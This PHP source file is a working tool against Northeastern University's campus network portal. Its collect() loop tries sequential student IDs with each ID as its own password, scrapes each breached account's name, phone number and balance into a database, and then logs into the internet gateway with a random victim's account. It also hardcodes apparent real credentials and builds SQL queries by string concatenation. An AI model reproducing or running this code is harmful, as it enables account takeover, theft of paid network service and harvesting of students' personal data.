<?php

/**
 * Created by PhpStorm.
 * User: Nigel
 * Date: 2015/12/31
 * Time: 12:55
 */
class IPGW {

    protected $cookiefile;
    public    $id;
    public    $pass;
    private   $dbc;

    function __construct($id = '20144633', $pass = '2025642313') {

        $this->id         = $id;
        $this->pass       = $pass;
        $this->cookiefile = __DIR__ . '\\cookie-ipgw.txt';
        $this->dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel', 'ipgw')
        or die("Error connecting db: " . mysqli_error($this->dbc));
        mysqli_set_charset($this->dbc, 'gbk');
    }

    //function __destruct() {
    //
    //    mysqli_close($this->dbc);
    //}

    /**
     * 登陆校园网管理中心
     *
     * @param $id   string
     * @param $pass string
     *
     * @return bool 登陆是否成功
     */
    function loginTree() {

        //获取cookie
        $loginUrl = 'http://tree.neu.edu.cn/user/user.Account?operation=login';
        $ch       = curl_init($loginUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        //相等于$encodedAuth = base64_encode(self::$pfAdapterUser.":".self::$pfAdapterPasswd);
        //curl_setopt($ch, CURLOPT_HTTPHEADER, array("Authentication : Basic ".$encodedAuth));
        //cookiejar的当前目录为c:xampp，所以必须指定决定路径
        //只带一个cookie行不行？
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookiefile);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        $bool = curl_exec($ch);
        curl_close($ch);
        if ($bool === false) {
            return false;
        }

        //登陆
        $loginUrl = 'http://tree.neu.edu.cn/user/user.Account?operation=login';
        $ch       = curl_init($loginUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        $response = curl_exec($ch);
        //user.Account?operation与user_banner.html的唯一区别
        if (false !== strpos($response, '<!--Add below--><td><table><tr><td nowrap><font color="ffffff" >')
            && false === strpos($response,
                                '<!--Add below--><td><table><tr><td nowrap><font color="ffffff" >口令错误.</font>')
        ) {
            return true;
        }

        return false;
    }

    /**
     * @return array|bool 获取信息
     */
    function getInfo() {

        $url = 'http://tree.neu.edu.cn/user/user.AccountManagement?operation=info&base_dn=self';

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookiefile);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERPWD, $this->id . ':' . $this->pass);
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36');
        curl_setopt($ch, CURLOPT_REFERER, 'http://tree.neu.edu.cn/user/user.Account?operation=login');
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $infoPage = curl_exec($ch);
        curl_close($ch);
        //获取失败或者账户不活跃
        if ($infoPage === false || false === strpos($infoPage, 'active')) {
            return false;
        }
        require_once "sdk/simple_html_dom.php";
        $html = preg_replace('/&nbsp;/', '', $infoPage);
        $html = new simple_html_dom($html);
        $info = array();

        list($id, $class) = explode(',', $html->find('font[color=#8b4513]', 0)->innertext);
        $info['id']      = explode('=', $id)[1];
        $info['class']   = explode('=', $class)[1];
        $info['balance'] = $html->find('font[color=#8b4513]', 2)->innertext;
        $info['name']    = $html->find('table tr', 1)->find('td', 1)->innertext;
        $info['tel']     = $html->find('table tr', 2)->find('td', 3)->innertext;

        return $info;
    }

    /**
     * 获取一个可用账号并储存
     */
    function getOne() {

        if ($this->loginTree()) {
            if ($info = $this->getInfo()) {
                $query = "insert into info(id,class,balance,name,tel,aval) VALUES ('" . $info["id"] . "','" . $info["class"] . "','" . $info["balance"] . "','" . $info["name"] . "','" . $info["tel"] . "'," . "1)";
                mysqli_query($this->dbc, $query) or die("error geting one: " . mysqli_error($this->dbc));
                //echo $query."\n";
                //echo mysqli_error($this->dbc);
                return true;
            }
        }

        return false;
    }

    /**
     * 清除不能用的账号
     */
    private function clean() {

    }

    /**
     * @return mixed 返回可用账号的数目
     */
    private function count() {

        $count = 'select count(*) from info WHERE aval=1 AND balance >10';
        $res = mysqli_query($this->dbc, $count) or die('Error querying db: ' . mysqli_error($this->dbc));

        return mysqli_fetch_array($res)[0];

    }

    /**
     * 查看账号是否存在
     *
     * @param $id string
     * @return bool
     */
    private function exist($id) {

        $query = "select * from info where id='$id'";
        $res = mysqli_query($this->dbc, $query) or die("Error checking exist: " . mysqli_error($this->dbc));

        return mysqli_fetch_array($res) ? true : false;
    }

    /**
     * 遍历，储存能用的账号
     */
    function collect() {

        $this->clean();
        $count = $this->count();
        $id    = 20151464;
        while ($count < 100 && $id < 20159000) {
            while ($this->exist($id)) {
                ++$id;
                echo "exist: $id\n";
            }
            $this->id   = $id;
            $this->pass = $this->id;

            if ($this->getOne()) {
                echo 'success: ' . $this->id . "\n";
                ++$count;
                ++$id;
            } else {
                $this->unavailable();
                echo "unavailable: $this->id\n";
                ++$id;
            }
            sleep(1);
        }

    }

    /**
     * 记录不可用的账号
     */
    private function unavailable() {

        $query = "insert into info(id,aval) VALUES ('$this->id',0)";
        mysqli_query($this->dbc, $query) or die("unavailable: " . mysqli_error($this->dbc));
    }

    /**
     * 登陆IP网关
     *
     * @param $uid       string
     * @param $pass      string
     * @param $operation int 0=connect 2=disconnect 3=disconnectall
     */
    function loginIPGW($uid, $pass, $operation = 0) {

        $post    = array(
            'uid'       => $uid,
            'password'  => $pass,
            'operation' => ['connect', 'disconnect', 'disconnectall'][$operation],
            'range'     => '2',
            'timeout'   => '1');
        $post    = http_build_query($post);
        $headers = array(
            "Connection: keep-alive",
            "Cache-Control: max-age=0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Origin: http://ipgw.neu.edu.cn",
            "Upgrade-Insecure-Requests: 1",
            "Content-Type: application/x-www-form-urlencoded",
            "Accept-Encoding: gzip, deflate",
            "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4",);

        $url = "http://ipgw.neu.edu.cn/ipgw/ipgw.ipgw";
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://ipgw.neu.edu.cn/');
        curl_setopt($ch, CURLOPT_USERAGENT,
                    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        curl_close($ch);
        //echo $response;
        if (($operation == 0 && strpos($response, "Connect successfully"))
            || ($operation == 1 && strpos($response, "Disconnect Succeeded"))
            || ($operation == 2 && strpos($response, "Disconnect All Succeeded"))
        ) {
            return true;
        }

        return false;
    }

    function login() {

        $query = "select * from info WHERE aval=1 AND balance >0";
        $res = mysqli_query($this->dbc, $query) or die("login: " . mysqli_error($this->dbc));
        while ($goodman[] = mysqli_fetch_array($res)) {

        }
        do {
            $key = array_rand($goodman);
            $id  = $goodman[$key]['id'];
            sleep(1);
        } while (!$this->loginIPGW($id, $id));

        echo "Thanks to: " . $goodman[$key]['name'] . "\n";
    }

}

header('content-type:text/html;charset=gbk');
$ipgw = new IPGW();
$ipgw->collect();
//(new IPGW())->getOne();
//var_dump($ipgw->loginIPGW('20144633', '2025642313', 0));
//$ipgw->login();